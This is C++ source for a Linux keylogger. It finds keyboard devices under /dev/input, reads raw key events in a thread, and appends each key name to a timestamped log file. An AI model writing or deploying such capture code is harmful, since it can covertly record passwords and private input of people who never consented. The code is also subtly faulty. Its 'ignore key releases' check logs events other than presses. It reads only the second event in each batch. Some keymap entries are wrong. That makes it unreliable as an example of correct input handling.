#include <string>
#include <iostream>
#include <fstream>
#include <regex>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <iomanip>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>

#include <linux/input.h>
#include <linux/version.h>
#include <sys/ioctl.h>


const std::string keys[] = {
    "<reserved>",		"<esc>",
    "1",			"2",
    "3",			"4",
    "5",			"6",
    "7",			"8",
    "9",			"0",
    "-",		"=",
    "<bs>",	"<tab>",
    "Q",			"W",
    "E",			"R",
    "T",			"Y",
    "U",			"I",
    "O",			"P",
    "{",	"}",
    "<enter>",		"<l-ctrl",
    "A",			"S",
    "D",			"F",
    "G",			"H",
    "J",			"K",
    "L",			";",
    "'",	"`",
    "<l-shift>",	"\\",
    "Z",			"X",
    "C",			"V",
    "B",			"N",
    "M",			",",
    ".",			"/",
    "<r-shift>",	"*",
    "<left-alt>",		"<space>",
    "<capslock",		"F1",
    "F2",			"F3",
    "F4",			"F5",
    "F6",			"F7",
    "F8",			"F9",
    "F10",			"<numlock>",
    "<scrolllock>",	"KP7",
    "KP8",			"KP9",
    "KPMinus",		"KP4",
    "KP5",			"KP6",
    "KPPlus",		"KP1",
    "KP2",			"KP3",
    "KP0",			"KPDot",
    "Zenkaku/Hankaku","102nd",
    "F11","F12",
    "RO","Katakana",
    "HIRA","Henkan",
    "Kata","Muhenkan",
    "KPJp","KPEnter",
    "Righ","KPSlash",
    "SysR","RightAlt",
    "Line","Home",
    "Up","PageUp",
    "Left","Right",
    "End","Down",
    "PageDown",	"Insert",
    "Delete",	"Macro",
    "Mute",		"VolumeDown",
    "VolumeUp",	"Power",
    "KPEqual",	"KPPlusMinus",
    "Pause",	"KPComma",
    "Hanguel",	"Hanja",
    "Yen",		"LeftMeta",
    "RightMeta","Compose",
    "Stop",		"Again",
    "Props",	"Undo",
    "Front",	"Copy",
    "Open",		"Paste",
    "Find",		"Cut",
    "Help",		"Menu",
    "Calc",		"Setup",
    "Sleep",	"WakeUp",
    "File","SendFile",
    "DeleteFile","X-fer",
    "Prog1",	"Prog2",
    "WWW",		"MSDOS",
    "Coffee",	"Direction",
    "CycleWindows","Mail",
    "Bookmarks","Computer",
    "Back",		"Forward",
    "CloseCD",	"EjectCD",
    "EjectCloseCD","NextSong",
    "PlayPause","PreviousSong",
    "StopCD",	"Record",
    "Rewind",	"Phone",
    "ISOKey",	"Config",
    "HomePage","Refresh",
    "Exit",	"Move",
    "Edit",	"ScrollUp",
    "ScrollDown","KPLeftParenthesis",
    "KPRightParenthesis","F13",
    "F14",		"F15",
    "F16",		"F17",
    "F18",		"F19",
    "F20",		"F21",
    "F22",		"F23",
    "F24",		"PlayCD",
    "PauseCD",	"Prog3",
    "Prog4",	"Suspend",
    "Close",	"Play",
    "Fast Forward","Bass Boost",
    "Print",	"HP",
    "Camera",	"Sound",
    "Question",	"Email",
    "Chat",		"Search",
    "Connect",	"Finance",
    "Sport",	"Shop",
    "Alternate Erase",	"Cancel",
    "Brightness down", "Brightness up",
    "Media",			"Unknown",
    "Btn0",			"Btn1",
    "Btn2",			"Btn3",
    "Btn4",			"Btn5",
    "Btn6",			"Btn7",
    "Btn8",			"Btn9",
    "LeftBtn",			"RightBtn",
    "MiddleBtn",		"SideBtn",
    "ExtraBtn",		"ForwardBtn",
    "BackBtn",			"TaskBtn",
    "Trigger",		"ThumbBtn",
    "ThumbBtn2",		"TopBtn",
    "TopBtn2",			"PinkieBtn",
    "BaseBtn",			"BaseBtn2",
    "BaseBtn3",		"BaseBtn4",
    "BaseBtn5",		"BaseBtn6",
    "BtnDead",			"BtnA",
    "BtnB",			"BtnC",
    "BtnX",			"BtnY",
    "BtnZ",			"BtnTL",
    "BtnTR",			"BtnTL2",
    "BtnTR2",			"BtnSelect",
    "BtnStart",		"BtnMode",
    "BtnThumbL",		"BtnThumbR",
    "ToolPen",		"ToolRubber",
    "ToolBrush",		"ToolPencil",
    "ToolAirbrush",	"ToolFinger",
    "ToolMouse",		"ToolLens",
    "Touch",			"Stylus",
    "Stylus2",		"Tool Doubletap",
    "Tool Tripletap", "WheelBtn",
    "Gear up",		"Ok",
    "Select",		"Goto",
    "Clear",			"Power2",
    "Option",		"Info",
    "Time",			"Vendor",
    "Archive",		"Program",
    "Channel",		"Favorites",
    "EPG",			"PVR",
    "MHP",			"Language",
    "Title",			"Subtitle",
    "Angle",			"Zoom",
    "Mode",			"Keyboard",
    "Screen",		"PC",
    "TV",			"TV2",
    "VCR",			"VCR2",
    "Sat",			"Sat2",
    "CD",			"Tape",
    "Radio",			"Tuner",
    "Player",		"Text",
    "DVD",			"Aux",
    "MP3",			"Audio",
    "Video",			"Directory",
    "List",			"Memo",
    "Calendar",		"Red",
    "Green",			"Yellow",
    "Blue",			"ChannelUp",
    "ChannelDown",	"First",
    "Last",			"AB",
    "Next",			"Restart",
    "Slow",			"Shuffle",
    "Break",			"Previous",
    "Digits",		"TEEN",
    "TWEN",			"Delete EOL",
    "Delete EOS",		"Insert line",
    "Delete line",
};

const std::string DEV_INPUT_EVENT = "/dev/input/";
const std::string EVENT_DEV_NAME = "event";

class ThreadData {

    public:
    std::string keyboard;
    std::string logFile;
    int kbdFile;

    ThreadData() {
        kbdFile = -1;
    }

    ~ThreadData() {
        close(kbdFile);
    }

    void openKbdFile() {
        kbdFile = open(keyboard.c_str(), O_RDONLY);
    }
};


static int is_event_device(const struct dirent *dir)
{
    return strncmp(EVENT_DEV_NAME.c_str(), dir->d_name, 5) == 0;
}


std::vector<std::string> getKeyboards()
{
    struct dirent **nameList;
    std::vector<std::string> keyboards;

    // Get number and list of devices in input device directory
    int numDev = scandir(DEV_INPUT_EVENT.c_str(), &nameList, is_event_device, versionsort);

    for (int i=0; i < numDev; ++i) {
        std::string fname;
        char nameStr[256] = "???";
        char* name = nameStr;
        int kbdFile = -1;

        // Get full input device path and open it
        std::string devName (nameList[i]->d_name);
        fname = DEV_INPUT_EVENT + devName;
        kbdFile = open(fname.c_str(), O_RDONLY);

        if (kbdFile < 0) {
            continue;
        }

        // Get type of input device
        ioctl(kbdFile, EVIOCGNAME(sizeof(nameStr)), name);
        close(kbdFile);

        // If the device type matches the regex pattern, add it to the vector
        std::regex kbdDevice(".*[Kk]eyboard.*");
        if (std::regex_match(name, kbdDevice)) keyboards.push_back(devName);

        free(nameList[i]);
    }

    return keyboards;
}


void *captureToLog(void* threadarg)
{
    // Retrieve and cast ThreadData instance from threadarg
    ThreadData *threadData;
    threadData = (ThreadData *) threadarg;

    int readEvent;
    struct input_event keyEvent[64];

    // Open log file and keyboard device file
    std::ofstream logFile (threadData->logFile.c_str(), std::ios::app);
    threadData->openKbdFile();

    if (threadData->kbdFile > 0) {
        // Write timestamp
        std::time_t time = std::time(nullptr);
        logFile << "\n| UTC: " << std::put_time(std::gmtime(&time), "%c %Z") << " |\n"
            << "-------------------------------------\n";

        while (1) {
            readEvent = read(threadData->kbdFile, keyEvent, sizeof(struct input_event) * 64);
            // Ignore key releases
            if (keyEvent[1].value !=1) {
                logFile << keys[keyEvent[1].code] << std::endl;
            }
        }
    }

    pthread_exit(NULL);
}
